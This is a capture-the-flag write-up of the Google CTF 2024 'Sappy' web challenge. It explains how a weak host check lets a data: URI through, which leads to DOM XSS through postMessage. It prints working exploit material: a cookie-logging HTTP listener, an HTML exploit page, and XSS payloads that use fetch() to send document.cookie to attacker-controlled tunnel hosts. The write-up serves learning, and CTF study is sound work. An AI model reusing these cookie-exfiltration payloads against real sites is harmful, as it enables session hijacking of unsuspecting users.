# SAPPY - GOOGLE CTF WEB (174pts)

I am a beginner programmer and I share what I learnt about JavaScript with the world!

Note: Flag is in the cookie

Attachment:
https://sappy-web.2024.ctfcompetition.com

![home](https://github.com/user-attachments/assets/39c9e6c7-e359-4cc3-88d8-5a0307e617b3)



## Potential SSRF

The challenge offers many cool javascript nuances but the main attack vector for this challenge is the search bar which essentially calls a bot to open our inputted URL.

I will test for SSRF by setting up a tunnel to map my private IP to a public address that the challenge can communicate with.

2️⃣ Cloudflare Tunnel (Free & Secure)

✅ Unlimited usage
✅ No need to expose your real IP
🛠 Setup:

```
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
chmod +x cloudflared
sudo mv cloudflared /usr/local/bin/
cloudflared tunnel --url http://localhost:8080

It will give you a Cloudflare-protected public URL.

📌 Website: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps

```

Below is a python script that will listen/handle the http server and capture all requests (hopefully get the cookie)

```
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("\n📌 Received Request:")
        print(f"🔹 Path: {self.path}")
        
        
        # Capture cookies if present
        cookies = self.headers.get('Cookie')
        print(f"🍪 Cookies: {cookies}")

        # print headers
        print(self.headers)

        # Send a simple response
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Captured your request headers!")

# Start the server on port 8080
def run_server(port=8080):
    server_address = ("0.0.0.0", port)
    httpd = HTTPServer(server_address, RequestLoggerHandler)
    print(f"🚀 Server running on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run_server()

```

Results of the script and tunnel method for SSRF cookie capture:

```
📌 Received Request:
🔹 Path: /
🍪 Cookies: None
Host: feof-hydraulic-nz-faculty.trycloudflare.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip
Accept-Language: en-US
Cdn-Loop: cloudflare; loops=1; subreqs=1
Cf-Connecting-Ip: 34.140.116.216
Cf-Ew-Via: 15
Cf-Ipcountry: BE
Cf-Ray: 912f889fb177213d-CDG
Cf-Visitor: {"scheme":"https"}
Cf-Warp-Tag-Id: 71b3acf2-8107-4515-9c19-5a859c243117
Cf-Worker: trycloudflare.com
Connection: keep-alive
Priority: u=0, i
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 34.140.116.216
X-Forwarded-Proto: https


127.0.0.1 - - [16/Feb/2025 13:16:08] "GET / HTTP/1.1" 200 -

📌 Received Request:
🔹 Path: /favicon.ico
🍪 Cookies: None
Host: feof-hydraulic-nz-faculty.trycloudflare.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip
Accept-Language: en-US
Cdn-Loop: cloudflare; loops=1; subreqs=1
Cf-Connecting-Ip: 34.140.116.216
Cf-Ew-Via: 15
Cf-Ipcountry: BE
Cf-Ray: 912f88a2e239213d-CDG
Cf-Visitor: {"scheme":"https"}
Cf-Warp-Tag-Id: 71b3acf2-8107-4515-9c19-5a859c243117
Cf-Worker: trycloudflare.com
Connection: keep-alive
Priority: u=1, i
Referer: https://feof-hydraulic-nz-faculty.trycloudflare.com/
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 34.140.116.216
X-Forwarded-Proto: https


127.0.0.1 - - [16/Feb/2025 13:16:08] "GET /favicon.ico HTTP/1.1" 200 -

```

Okay, a lot to unpack.

### Redirect method through initial GET request from bot

From the first response captured we see that the bot accepts html responses - which can be used for javascript.

Try to redirect to another one of my controlled sites to see if I can get the cookie through another method. The below sends an html code with javascript that will send the bots cookies to a second public address I have control over and can monitor requests.

```
# Send a simple response
self.send_response(200)
self.send_header('Content-type', 'text/html')
self.end_headers()
self.wfile.write(b"<h1>hello<script>fetch('https://jewish-banner-tribal-grace.trycloudflare.com',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'stuff: '+document.cookie});</script></h1>")

```

This route results in no cookies :(

### DOM XSS

Looking at the source code for the challenge there is an iframe in use behind each of the clickable buttons that sends a fetch request to the pages.json file on the server and then writes the results of that request to the page directly.

In the sap.js file, we see the event handler that manages the fetch behind the iframe content in addition to buildUrl and validate the host. To summarize, through the event listener we can modify where the fetch request goes. The key vulnerability in this process lies under the validate(host) function. Specifically, the URI scheme of http or https is not enforced so we can bypass the validation and send pure data containing our XSS payload with a data: URI:

```
iframe.contentWindow.postMessage(JSON.stringify({ method: 'initialize', host: 'data://sappy-web.2024.ctfcompetition.com'}), '*')
```

Result:

```
sap.js:391 
       GET data://sappy-web.2024.ctfcompetition.com/sap/ net::ERR_INVALID_URL
(anonymous) @ sap.js:391
postMessage
(anonymous) @ VM10004:1
sap.js:391 
       Uncaught (in promise) TypeError: Failed to fetch
    at sap.js:391:316
```

This is a success, this means we bypasses the URL validation because it didn't return "invalid host".

Next we need to append our XSS payload to the URL so that when the event is called our payload will be uploaded to the iframe box.

The postMessage:

```
iframe.contentWindow.postMessage(JSON.stringify({ method: 'render', page: ',{"html":"<img src=x onerror=alert()>"}'}),'*')
```

The above results in a url of:

```
data://sappy-web.2024.ctfcompetition.com/sap/,{"html":"<img src=x onerror=alert()>"}
```

Based on the format of data: URI schemes, the data portion following the comma is directly sent as the response of the fetch request. The payload needs the JSON format with the "html" key because the event listener normally expects a json file with objects that have an "html" name within.

The check for JSON and html key:

```
case "render": {
        if (typeof data.page !== "string") return;
        const url = buildUrl({
          host: API.host,
          page: data.page,
        });
        const resp = await fetch(url);
        if (resp.status !== 200) {
          console.error("something went wrong");
          return;
        }
        const json = await resp.json();
        if (typeof json.html === "string") {
          output.innerHTML = json.html;
        }
        break;
      }
```

Payload success:

![xss](https://github.com/user-attachments/assets/7dbea1df-fa90-4a7a-96c4-075c7bfd083c)


### Bot cookies

To get cookies I need to make my own html containing an iframe or secondary call to the challenge domain with the dom xss to capture cookies.

Modified postmessage to capture cookies and send it to a listeneing address:

```
iframe.contentWindow.postMessage(JSON.stringify({ method: 'render', page: ',{"html":"<img src=x onerror=fetch(\'https://ut-herbs-warcraft-pumps.trycloudflare.com/?page='+document.cookie+'\')>"}'}),'*')
```

HTML page to be delivered to bot:

```
<!DOCTYPE html>
<html>
<h>blah</h>
<iframe src="https://sappy-web.2024.ctfcompetition.com/sap.html"></iframe>
<script>
    const iframe = document.querySelector("iframe");
    function onIframeLoad(){
        iframe.contentWindow.postMessage(JSON.stringify({ method: 'initialize', host: 'data://sappy-web.2024.ctfcompetition.com'}), '*')
        iframe.contentWindow.postMessage(JSON.stringify({ method: 'render', page: ',{"html":"<img src=x onerror=fetch(\'https://ut-herbs-warcraft-pumps.trycloudflare.com/?page='+document.cookie+'\')>"}'}),'*')
    };
    iframe.addEventListener("load",onIframeLoad)
</script>
</html>

```

When I test the above page locally, it works successfully and the cookies on my local victim device get sent to the listener. But when I try to serve this html to the bot, no cookie is returned.

Here I looked at past writeups and found that the cookie had a secure attribute and had to use HTTPS. I ended up needing to use certificates and to modify my listener. 

The challenge summary: First I needed to find a DOM XSS vulnerability on the challenge site. Next this XSS needed to be exploited to exfiltrate cookie information to a server under my control. Once this was acheived, a malicious html/server needed to be sent to the bot that would open a popup to the DOM XSS affected challenge url to retrieve the cookie information. 

## References & Learning

- favicon
	- youtube: "These Icons Can Track You! New Vulnerability Discovered!"
- python http.server, BaseHTTPRequestHandler
- SSRF
- cloudfare tunneling
- cors, secure cookies, headers
- postMessage
- addEventListener
- iframes
- URL (scheme, host, path, query, fragment)
- https://zimzi.substack.com/p/googlectf-2024-sappy
